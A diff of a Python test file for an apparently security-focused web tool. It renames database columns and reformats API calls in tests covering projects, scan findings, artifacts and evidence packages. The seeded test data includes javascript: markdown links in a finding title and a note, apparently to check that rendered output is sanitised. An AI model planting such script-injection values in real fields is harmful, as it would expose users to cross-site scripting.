+                                "line_index": 0,
+                                "signals": ["findings"],
+                                "entities": [{"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"}],
+                            },
+                            {
+                                "text": "rate:  0.10-kpps, 49.90% done,   0:00:09 remaining, found=2",
+                                "role": "progress",
+                                "noise_kind": "progress",
+                                "line_index": 1,
+                            },
+                            {"text": "scan completed", "cls": "", "line_index": 2},
+                        ]
+                    ),
                     3,
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?)",
                 (
                     baseline_run_id,
@@ -9392,7 +9479,7 @@ class TestProjectRoutes:
                 ),
             )
             conn.execute(
-                "INSERT INTO runs (id, session_id, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, ?, ?, ?, ?)",
                 (
                     outside_run_id,
@@ -9428,9 +9515,7 @@ class TestProjectRoutes:
         )
         assert baseline_link_resp.status_code == 201
 
-        links = json.loads(
-            client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data
-        )
+        links = json.loads(client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data)
         assert {item["entity_id"] for item in links["links"]} == {run_id, baseline_run_id}
         assert all("provenance" not in item for item in links["links"])
 
@@ -9448,10 +9533,12 @@ class TestProjectRoutes:
         assert duplicate_label.status_code == 201
         label = json.loads(label_resp.data)["label"]
         assert json.loads(duplicate_label.data)["label"]["id"] == label["id"]
-        labels = json.loads(client.get(
-            f"/entities/run/{run_id}/labels",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        labels = json.loads(
+            client.get(
+                f"/entities/run/{run_id}/labels",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["label"] for item in labels["labels"]] == ["baseline"]
 
         note_resp = client.put(
@@ -9468,23 +9555,27 @@ class TestProjectRoutes:
             artifact_bytes = b"0123456789"
             artifact_path.write_bytes(artifact_bytes)
             artifact_hash = hashlib.sha256(artifact_bytes).hexdigest()
-        updated_note = json.loads(client.put(
-            f"/entities/run/{run_id}/note",
-            json={"body": "Confirmed service owner"},
-            headers={"X-Session-ID": session_id},
-        ).data)["note"]
+        updated_note = json.loads(
+            client.put(
+                f"/entities/run/{run_id}/note",
+                json={"body": "Confirmed service owner"},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["note"]
         assert updated_note["id"] == note["id"]
         assert updated_note["body"] == "Confirmed service owner"
-        note_payload = json.loads(client.get(
-            f"/entities/run/{run_id}/note",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        note_payload = json.loads(
+            client.get(
+                f"/entities/run/{run_id}/note",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert note_payload["note"]["id"] == note["id"]
 
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, "
                 "detected_by, content_sha256, created) "
                 "VALUES (?, ?, ?, 'reports/run.txt', 'run.txt', 'output', 10, "
                 "'workspace_flag', ?, datetime('now'))",
@@ -9492,52 +9583,52 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'run_file_artifact', ?, 'evidence', datetime('now'))",
                 (f"lbl_rfa_{run_id}", session_id, f"rfa_{run_id}"),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'run_file_artifact', ?, 'Raw output reviewed', "
                 "datetime('now'), datetime('now'))",
                 (f"note_rfa_{run_id}", session_id, f"rfa_{run_id}"),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, severity, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, severity, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'high', '[click](javascript:alert(1))', "
                 "'443/tcp open https', 0, ?, datetime('now'))",
                 (f"fnd_{run_id}", session_id, run_id, f"fp-{run_id}"),
             )
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'finding', ?, 'important', datetime('now'))",
                 (f"lbl_fnd_{run_id}", session_id, f"fnd_{run_id}"),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'finding', ?, 'needs [retest](javascript:alert(2))', "
                 "datetime('now'), datetime('now'))",
                 (f"note_fnd_{run_id}", session_id, f"fnd_{run_id}"),
             )
             conn.execute(
                 "INSERT INTO run_file_artifacts "
-                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                 "VALUES (?, ?, ?, 'reports/old.txt', 'old.txt', 'output', 8, 'workspace_flag', datetime('now'))",
                 (f"rfa_{baseline_run_id}", session_id, baseline_run_id),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'open port 80', '80/tcp open http', 0, ?, datetime('now'))",
                 (f"fnd_{baseline_run_id}", session_id, baseline_run_id, f"fp-{baseline_run_id}"),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, first_run_id, last_run_id, scope, title, raw_line, "
+                "(id, personal_workspace_id, run_id, first_run_id, last_run_id, scope, title, raw_line, "
                 "line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, ?, ?, 'finding', 'direct run finding', '8080/tcp open http-proxy', "
                 "1, ?, datetime('now'))",
@@ -9545,7 +9636,7 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                 "VALUES (?, ?, ?, 'finding', 'outside project finding', 'outside project', 0, ?, datetime('now'))",
                 (f"fnd_{outside_run_id}", session_id, outside_run_id, f"fp-{outside_run_id}"),
             )
@@ -9555,31 +9646,39 @@ class TestProjectRoutes:
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'finding', ?, 'direct run fallback', datetime('now'), datetime('now'))",
                 (f"note_fnd_direct_{run_id}", session_id, f"fnd_direct_{run_id}"),
             )
             conn.commit()
         with mock.patch.dict(shell_app_module.CFG, {"workspace_enabled": True}):
-            summary = json.loads(client.get(
-                f"/projects/{project['id']}/summary",
-                headers={"X-Session-ID": session_id},
-            ).data)
-            artifacts_page = json.loads(client.get(
-                f"/projects/{project['id']}/artifacts?limit=1&offset=0",
-                headers={"X-Session-ID": session_id},
-            ).data)
+            summary = json.loads(
+                client.get(
+                    f"/projects/{project['id']}/summary",
+                    headers={"X-Session-ID": session_id},
+                ).data
+            )
+            artifacts_page = json.loads(
+                client.get(
+                    f"/projects/{project['id']}/artifacts?limit=1&offset=0",
+                    headers={"X-Session-ID": session_id},
+                ).data
+            )
             assert artifacts_page["total"] == 2
             assert artifacts_page["limit"] == 1
             assert len(artifacts_page["artifacts"]) == 1
-            all_artifacts = json.loads(client.get(
-                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
-                headers={"X-Session-ID": session_id},
-            ).data)
-            searched_artifacts = json.loads(client.get(
-                f"/projects/{project['id']}/artifacts?limit=10&offset=0&q=run",
-                headers={"X-Session-ID": session_id},
-            ).data)
+            all_artifacts = json.loads(
+                client.get(
+                    f"/projects/{project['id']}/artifacts?limit=10&offset=0",
+                    headers={"X-Session-ID": session_id},
+                ).data
+            )
+            searched_artifacts = json.loads(
+                client.get(
+                    f"/projects/{project['id']}/artifacts?limit=10&offset=0&q=run",
+                    headers={"X-Session-ID": session_id},
+                ).data
+            )
             artifact_statuses = {item["workspace_path"]: item for item in all_artifacts["artifacts"]}
             assert artifact_statuses["reports/run.txt"]["file_status"] == "available"
             assert artifact_statuses["reports/run.txt"]["file_available"] is True
@@ -9623,13 +9722,13 @@ class TestProjectRoutes:
             )
             assert missing_preview.status_code == 404
             artifact_path.write_bytes(b"abcdefghij")
-            changed_artifacts = json.loads(client.get(
-                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
-                headers={"X-Session-ID": session_id},
-            ).data)
-            changed_artifact = {
-                item["workspace_path"]: item for item in changed_artifacts["artifacts"]
-            }["reports/run.txt"]
+            changed_artifacts = json.loads(
+                client.get(
+                    f"/projects/{project['id']}/artifacts?limit=10&offset=0",
+                    headers={"X-Session-ID": session_id},
+                ).data
+            )
+            changed_artifact = {item["workspace_path"]: item for item in changed_artifacts["artifacts"]}["reports/run.txt"]
             assert changed_artifact["file_status"] == "changed"
             assert "checksum differs" in changed_artifact["file_status_detail"]
         assert summary["project"]["id"] == project["id"]
@@ -9648,10 +9747,12 @@ class TestProjectRoutes:
             "review_states": {"new": 3},
             "severities": {"high": 1, "info": 2},
         }
-        counted_list = json.loads(client.get(
-            "/projects?include_archived=1&include_counts=1&limit=10&offset=0",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        counted_list = json.loads(
+            client.get(
+                "/projects?include_archived=1&include_counts=1&limit=10&offset=0",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         counted_project = next(item for item in counted_list["projects"] if item["id"] == project["id"])
         assert counted_project["finding_summary"] == summary["finding_summary"]
         assert summary["artifacts"] == []
@@ -9665,20 +9766,24 @@ class TestProjectRoutes:
         assert run_summaries[run_id]["artifact_count"] == 1
         assert run_summaries[baseline_run_id]["finding_count"] == 1
         assert run_summaries[baseline_run_id]["artifact_count"] == 1
-        paged_runs = json.loads(client.get(
-            f"/projects/{project['id']}/runs?limit=1&offset=0",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        paged_runs = json.loads(
+            client.get(
+                f"/projects/{project['id']}/runs?limit=1&offset=0",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert paged_runs["total"] == 2
         assert paged_runs["limit"] == 1
         assert paged_runs["offset"] == 0
         assert len(paged_runs["runs"]) == 1
         assert {"finding_count", "artifact_count"}.issubset(paged_runs["runs"][0])
-        project_findings = json.loads(client.get(
-            f"/projects/{project['id']}/findings?review_state=new&command_root=nmap&run_id={run_id}"
-            "&label=important&note_state=noted&severity=high&scope=finding",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        project_findings = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?review_state=new&command_root=nmap&run_id={run_id}"
+                "&label=important&note_state=noted&severity=high&scope=finding",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["run_id"] for item in project_findings["findings"]] == [run_id]
         assert project_findings["findings"][0]["command_root"] == "nmap"
         bulk_review_resp = client.post(
@@ -9699,8 +9804,7 @@ class TestProjectRoutes:
         assert audit_rows[0]["project_id"] == project["id"]
         assert audit_rows[0]["details"]["finding_ids"] == [f"fnd_{run_id}"]
         activity_resp = client.get(
-            f"/projects/{project['id']}/activity?event_type=finding.review_change"
-            f"&target_type=finding&target_id=fnd_{run_id}",
+            f"/projects/{project['id']}/activity?event_type=finding.review_change&target_type=finding&target_id=fnd_{run_id}",
             headers={"X-Session-ID": session_id},
         )
         assert activity_resp.status_code == 200
@@ -9715,31 +9819,39 @@ class TestProjectRoutes:
             }
         assert review_rows[f"fnd_{run_id}"] == "important"
         assert review_rows[f"fnd_{outside_run_id}"] == "new"
-        multi_value_findings = json.loads(client.get(
-            f"/projects/{project['id']}/findings?run_id={run_id}&run_id={baseline_run_id}"
-            f"&review_state=new&review_state=reviewed&review_state=important&label=important&label=missing",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        multi_value_findings = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?run_id={run_id}&run_id={baseline_run_id}"
+                f"&review_state=new&review_state=reviewed&review_state=important&label=important&label=missing",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["run_id"] for item in multi_value_findings["findings"]] == [run_id]
-        unnoted_findings = json.loads(client.get(
-            f"/projects/{project['id']}/findings?note_state=unnoted",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        unnoted_findings = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?note_state=unnoted",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["run_id"] for item in unnoted_findings["findings"]] == [baseline_run_id]
-        paged_findings = json.loads(client.get(
-            f"/projects/{project['id']}/findings?limit=1&offset=1",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        paged_findings = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?limit=1&offset=1",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert paged_findings["total"] == 3
         assert paged_findings["limit"] == 1
         assert paged_findings["offset"] == 1
         assert len(paged_findings["findings"]) == 1
         assert paged_findings["has_more"] is True
         assert paged_findings["group_counts"] == {"nmap darklab.sh": 3}
-        comparison = json.loads(client.get(
-            self._project_compare_url(project["id"], left=run_id, right=baseline_run_id),
-            headers={"X-Session-ID": session_id},
-        ).data)
+        comparison = json.loads(
+            client.get(
+                self._project_compare_url(project["id"], left=run_id, right=baseline_run_id),
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["raw_line"] for item in comparison["objects"]["findings"]["added"]] == ["80/tcp open http"]
         assert [item["raw_line"] for item in comparison["objects"]["findings"]["removed"]] == ["443/tcp open https"]
         assert [item["workspace_path"] for item in comparison["objects"]["artifacts"]["added"]] == ["reports/old.txt"]
@@ -9750,10 +9862,12 @@ class TestProjectRoutes:
             headers={"X-Session-ID": session_id},
         )
         assert baseline_label.status_code == 201
-        baseline_comparison = json.loads(client.get(
-            self._project_compare_url(project["id"], left=run_id, baseline_label="baseline"),
-            headers={"X-Session-ID": session_id},
-        ).data)
+        baseline_comparison = json.loads(
+            client.get(
+                self._project_compare_url(project["id"], left=run_id, baseline_label="baseline"),
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert baseline_comparison["left_run_id"] == baseline_run_id
         assert baseline_comparison["right_run_id"] == run_id
         assert baseline_comparison["baseline_label"] == "baseline"
@@ -9762,21 +9876,23 @@ class TestProjectRoutes:
             headers={"X-Session-ID": session_id},
         )
         assert invalid_project_findings.status_code == 400
-        evidence_target = json.loads(client.post(
-            f"/projects/{project['id']}/targets",
-            json={"type": "domain", "value": "darklab.sh", "source_run_id": run_id},
-            headers={"X-Session-ID": session_id},
-        ).data)["target"]
+        evidence_target = json.loads(
+            client.post(
+                f"/projects/{project['id']}/targets",
+                json={"type": "domain", "value": "darklab.sh", "source_run_id": run_id},
+                headers={"X-Session-ID": session_id},
+            ).data
+        )["target"]
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
                 "INSERT INTO entity_labels "
-                "(id, session_id, entity_type, entity_id, label, created) "
+                "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                 "VALUES (?, ?, 'target', ?, 'production', datetime('now'))",
                 (f"lbl_tgt_{run_id}", session_id, evidence_target["id"]),
             )
             conn.execute(
                 "INSERT INTO entity_notes "
-                "(id, session_id, entity_type, entity_id, body, created, updated) "
+                "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                 "VALUES (?, ?, 'target', ?, 'Primary external target', datetime('now'), datetime('now'))",
                 (f"note_tgt_{run_id}", session_id, evidence_target["id"]),
             )
@@ -9913,10 +10029,7 @@ class TestProjectRoutes:
         assert import_hints["target_relationships"][0]["finding_id"] == f"fnd_{run_id}"
         assert import_hints["target_relationships"][0]["target_id"] == evidence_target["id"]
         assert import_hints["finding_review_state"][0]["review_state"] == "important"
-        import_hint_warnings = {
-            (warning["code"], warning.get("entity_id")): warning
-            for warning in import_hints["warnings"]
-        }
+        import_hint_warnings = {(warning["code"], warning.get("entity_id")): warning for warning in import_hints["warnings"]}
         assert import_hint_warnings[("artifact_not_available", f"rfa_{run_id}")]["status"] == "changed"
         assert import_hint_warnings[("artifact_not_available", f"rfa_{baseline_run_id}")]["status"] == "missing"
         package_label_resp = client.post(
@@ -9932,17 +10045,21 @@ class TestProjectRoutes:
         assert package_label_resp.status_code == 201
         assert package_note_resp.status_code == 200
 
-        packages = json.loads(client.get(
-            f"/projects/{project['id']}/packages",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        packages = json.loads(
+            client.get(
+                f"/projects/{project['id']}/packages",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert [item["id"] for item in packages["packages"]] == [package["id"]]
         assert [item["label"] for item in packages["packages"][0]["labels"]] == ["handoff"]
         assert packages["packages"][0]["note"]["body"] == "Package review note"
-        package_get = json.loads(client.get(
-            f"/projects/{project['id']}/packages/{package['id']}",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        package_get = json.loads(
+            client.get(
+                f"/projects/{project['id']}/packages/{package['id']}",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert package_get["package"]["name"] == "Draft Evidence"
         assert [item["label"] for item in package_get["package"]["labels"]] == ["handoff"]
         assert package_get["package"]["note"]["body"] == "Package review note"
@@ -9957,8 +10074,7 @@ class TestProjectRoutes:
         assert package_download.status_code == 200
         assert "attachment" in package_download.headers["Content-Disposition"]
         download_log = next(
-            call for call in package_log.call_args_list
-            if call.args and call.args[0] == "EVIDENCE_PACKAGE_DOWNLOADED"
+            call for call in package_log.call_args_list if call.args and call.args[0] == "EVIDENCE_PACKAGE_DOWNLOADED"
         )
         download_log_extra = download_log.kwargs["extra"]
         assert download_log_extra["duration_ms"] >= 0
@@ -10033,9 +10149,7 @@ class TestProjectRoutes:
         _assert_no_audit_private_export_strings(package_archive_text)
         assert downloaded_manifest["manifest"]["counts"]["runs"] == 1
         assert downloaded_manifest["manifest"]["counts"]["artifacts"] == 2
-        assert downloaded_manifest["manifest"]["import_hints"]["target_relationships"][0]["target_id"] == (
-            evidence_target["id"]
-        )
+        assert downloaded_manifest["manifest"]["import_hints"]["target_relationships"][0]["target_id"] == (evidence_target["id"])
         assert downloaded_manifest["transcripts"][0]["run_id"] == run_id
         assert downloaded_manifest["transcripts"][0]["archive_path"] == f"runs/{run_id}.html"
         assert downloaded_manifest["transcripts"][0]["lines"][0]["line_index"] == 0
@@ -10049,7 +10163,7 @@ class TestProjectRoutes:
         assert findings_json["findings"][0]["target_references"][0]["source_run_id"] == run_id
         assert findings_json["findings"][0]["triage"] == {
             "id": triage_payload["triage"]["id"],
-            "session_id": session_id,
+            "personal_workspace_id": session_id,
             "team_id": "",
             "finding_id": f"fnd_{run_id}",
             "remediation": "Patch TLS config for darklab.sh.",
@@ -10066,9 +10180,7 @@ class TestProjectRoutes:
             "remediation_updated_at": triage_payload["triage"]["remediation_updated_at"],
             "verification_disposition": None,
         }
-        assert downloaded_manifest["manifest"]["findings"][0]["triage"]["remediation"] == (
-            "Patch TLS config for darklab.sh."
-        )
+        assert downloaded_manifest["manifest"]["findings"][0]["triage"]["remediation"] == ("Patch TLS config for darklab.sh.")
         assert "# Findings" in findings_md
         assert "443/tcp open https" in findings_md
         assert "domain: darklab.sh" in findings_md
@@ -10164,14 +10276,15 @@ class TestProjectRoutes:
         assert {item["kind"] for item in skipped_items["items"]} == {"artifact", "transcript"}
         assert any(item.get("workspace_path") == "reports/old.txt" for item in skipped_items["items"])
         assert any(
-            item.get("workspace_path") == "reports/run.txt"
-            and "checksum differs" in item.get("reason", "")
+            item.get("workspace_path") == "reports/run.txt" and "checksum differs" in item.get("reason", "")
             for item in skipped_items["items"]
         )
-        summary_after_package = json.loads(client.get(
-            f"/projects/{project['id']}/summary",
-            headers={"X-Session-ID": session_id},
-        ).data)
+        summary_after_package = json.loads(
+            client.get(
+                f"/projects/{project['id']}/summary",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
         assert summary_after_package["counts"]["packages"] == 1
         assert summary_after_package["counts"]["labels"] == 6
         assert summary_after_package["counts"]["notes"] == 7
@@ -10211,9 +10324,7 @@ class TestProjectRoutes:
             json={"entity_type": "run", "entity_id": baseline_run_id},
             headers={"X-Session-ID": session_id},
         )
-        empty_links = json.loads(
-            client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data
-        )
+        empty_links = json.loads(client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data)
         assert empty_links["links"] == []
 
         execute_builtin_command(f"project use {project['slug']}", session_id)
@@ -10256,7 +10367,7 @@ class TestProjectRoutes:
             for index in range(3):
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                    "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                     "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, ?)",
                     (
                         f"fnd_katana_{index}_{uuid.uuid4().hex}",
@@ -10272,7 +10383,7 @@ class TestProjectRoutes:
             for index in range(2):
                 conn.execute(
                     "INSERT INTO findings "
-                    "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
+                    "(id, personal_workspace_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                     "VALUES (?, ?, ?, 'finding', ?, ?, ?, ?, ?)",
                     (
                         f"fnd_httpx_{index}_{uuid.uuid4().hex}",
@@ -10287,50 +10398,68 @@ class TestProjectRoutes:
                 )
             conn.commit()
 
-        first_page = json.loads(client.get(
-            f"/projects/{project['id']}/findings?limit=3&offset=0",
-            headers={"X-Session-ID": session_id},
-        ).data)
-        collapsed_page = json.loads(client.get(
-            f"/projects/{project['id']}/findings?"
-            + urlencode({
-                "limit": "3",
-                "offset": "0",
-                "collapsed_group": "katana -u https://darklab.sh",
-            }),
-            headers={"X-Session-ID": session_id},
-        ).data)
-        collapsed_page_without_counts = json.loads(client.get(
-            f"/projects/{project['id']}/findings?"
-            + urlencode({
-                "limit": "3",
-                "offset": "0",
-                "collapsed_group": "katana -u https://darklab.sh",
-                "include_collapsed_group_counts": "0",
-            }),
-            headers={"X-Session-ID": session_id},
-        ).data)
-        page_without_count = json.loads(client.get(
-            f"/projects/{project['id']}/findings?"
-            + urlencode({
-                "limit": "3",
-                "offset": "0",
-                "include_total": "0",
-                "known_total": "5",
-                "include_group_counts": "0",
-            }),
-            headers={"X-Session-ID": session_id},
-        ).data)
-        search_page = json.loads(client.get(
-            f"/projects/{project['id']}/findings?"
-            + urlencode({
-                "limit": "3",
-                "offset": "0",
-                "q": "api.darklab",
-                "include_group_counts": "0",
-            }),
-            headers={"X-Session-ID": session_id},
-        ).data)
+        first_page = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?limit=3&offset=0",
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
+        collapsed_page = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?"
+                + urlencode(
+                    {
+                        "limit": "3",
+                        "offset": "0",
+                        "collapsed_group": "katana -u https://darklab.sh",
+                    }
+                ),
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
+        collapsed_page_without_counts = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?"
+                + urlencode(
+                    {
+                        "limit": "3",
+                        "offset": "0",
+                        "collapsed_group": "katana -u https://darklab.sh",
+                        "include_collapsed_group_counts": "0",
+                    }
+                ),
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
+        page_without_count = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?"
+                + urlencode(
+                    {
+                        "limit": "3",
+                        "offset": "0",
+                        "include_total": "0",
+                        "known_total": "5",
+                        "include_group_counts": "0",
+                    }
+                ),
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
+        search_page = json.loads(
+            client.get(
+                f"/projects/{project['id']}/findings?"
+                + urlencode(
+                    {
+                        "limit": "3",
+                        "offset": "0",
+                        "q": "api.darklab",
+                        "include_group_counts": "0",
+                    }
+                ),
+                headers={"X-Session-ID": session_id},
+            ).data
+        )
 
         assert [item["run_command"] for item in first_page["findings"]] == [
             "katana -u https://darklab.sh",
@@ -10374,7 +10503,7 @@ class TestProjectRoutes:
         missing_run_id = "run-" + uuid.uuid4().hex
         with sqlite3.connect(DB_PATH) as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started) "
                 "VALUES (?, ?, 'builtin', ?, datetime('now'))",
                 (builtin_run_id, session_id, "history"),
             )
@@ -10482,8 +10611,7 @@ class TestProjectRoutes:
             linked_entities = {
                 row["entity_id"]
                 for row in conn.execute(
-                    "SELECT entity_id FROM project_links "
-                    "WHERE project_id = ? AND entity_type = 'atlas_entity'",
+                    "SELECT entity_id FROM project_links WHERE project_id = ? AND entity_type = 'atlas_entity'",
                     (project["id"],),
                 ).fetchall()
             }
@@ -10583,9 +10711,7 @@ class TestProjectRoutes:
         assert info_events["PROJECT_AUTO_PROMOTE_RULE_UPDATED"]["enabled"] is True
         assert info_events["PROJECT_AUTO_PROMOTE_RULE_DELETED"]["target_entity_kind"] == "domain"
         apply_extras = [
-            call.kwargs["extra"]
-            for call in info_log.call_args_list
-            if call.args[0] == "PROJECT_AUTO_PROMOTE_RULE_APPLIED"
+            call.kwargs["extra"] for call in info_log.call_args_list if call.args[0] == "PROJECT_AUTO_PROMOTE_RULE_APPLIED"
         ]
         applied_extra = next(extra for extra in apply_extras if extra["linked_count"] == 1)
         assert applied_extra["linked_count"] == 1
@@ -10596,9 +10722,9 @@ class TestProjectRoutes:
         warning_events = {call.args[0]: call.kwargs["extra"] for call in warning_log.call_args_list}
         assert warning_events["PROJECT_AUTO_PROMOTE_RULE_PREVIEW_REJECTED"]["http_status"] == 400
         assert warning_events["PROJECT_AUTO_PROMOTE_RULE_DELETE_MISS"]["http_status"] == 404
-        all_extras = [call.kwargs["extra"] for call in (
-            debug_log.call_args_list + info_log.call_args_list + warning_log.call_args_list
-        )]
+        all_extras = [
+            call.kwargs["extra"] for call in (debug_log.call_args_list + info_log.call_args_list + warning_log.call_args_list)
+        ]
         assert all("pattern" not in extra and "name" not in extra for extra in all_extras)
         serialized_extras = json.dumps(all_extras)
         assert "darklab.sh" not in serialized_extras
@@ -10635,10 +10761,14 @@ class TestProjectRoutes:
             "truncated": False,
         }
         with (
-            mock.patch.dict(project_routes.CFG, {
-                "max_project_auto_promote_preview_matches": 7,
-                "max_project_auto_promote_apply_matches": 9,
-            }, clear=False),
+            mock.patch.dict(
+                project_routes.CFG,
+                {
+                    "max_project_auto_promote_preview_matches": 7,
+                    "max_project_auto_promote_apply_matches": 9,
+                },
+                clear=False,
+            ),
             mock.patch.object(project_routes, "preview_auto_promote_rule", return_value=fake_preview) as preview_mock,
             mock.patch.object(project_routes, "apply_auto_promote_rule", return_value=fake_apply) as apply_mock,
         ):
@@ -10728,18 +10858,20 @@ class TestProjectRoutes:
         run_id = "run-url-target-finalize-" + uuid.uuid4().hex
 
         class FakeCapture:
-            preview_lines = [{
-                "text": "window output classList.add(document.querySelectorAll('.x'))",
-                "cls": "",
-                "entities": [
-                    {"type": "domain", "value": "classList.add", "canonical_value": "classlist.add"},
-                    {
-                        "type": "domain",
-                        "value": "document.querySelectorAll",
-                        "canonical_value": "document.queryselectorall",
-                    },
-                ],
-            }]
+            preview_lines = [
+                {
+                    "text": "window output classList.add(document.querySelectorAll('.x'))",
+                    "cls": "",
+                    "entities": [
+                        {"type": "domain", "value": "classList.add", "canonical_value": "classlist.add"},
+                        {
+                            "type": "domain",
+                            "value": "document.querySelectorAll",
+                            "canonical_value": "document.queryselectorall",
+                        },
+                    ],
+                }
+            ]
             preview_truncated = False
             output_line_count = 1
             full_output_available = False
@@ -10826,14 +10958,16 @@ class TestProjectRoutes:
         run_id = "run-auto-promote-finalize-" + uuid.uuid4().hex
 
         class FakeCapture:
-            preview_lines = [{
-                "text": "darklab.sh 104.21.4.35",
-                "cls": "",
-                "entities": [
-                    {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
-                    {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
-                ],
-            }]
+            preview_lines = [
+                {
+                    "text": "darklab.sh 104.21.4.35",
+                    "cls": "",
+                    "entities": [
+                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
+                        {"type": "ip", "value": "104.21.4.35", "canonical_value": "104.21.4.35"},
+                    ],
+                }
+            ]
             preview_truncated = False
             output_line_count = 1
             full_output_available = False
@@ -10860,22 +10994,22 @@ class TestProjectRoutes:
         assert active_set.status_code == 200
         assert enabled.status_code == 201
         auto_promote_log = next(
-            call.kwargs["extra"]
-            for call in info_log.call_args_list
-            if call.args[0] == "PROJECT_AUTO_PROMOTE_RUN_APPLIED"
+            call.kwargs["extra"] for call in info_log.call_args_list if call.args[0] == "PROJECT_AUTO_PROMOTE_RUN_APPLIED"
         )
         assert auto_promote_log["project_ids"] == [project["id"]]
         assert auto_promote_log["rule_ids"] == [enabled.get_json()["rule"]["id"]]
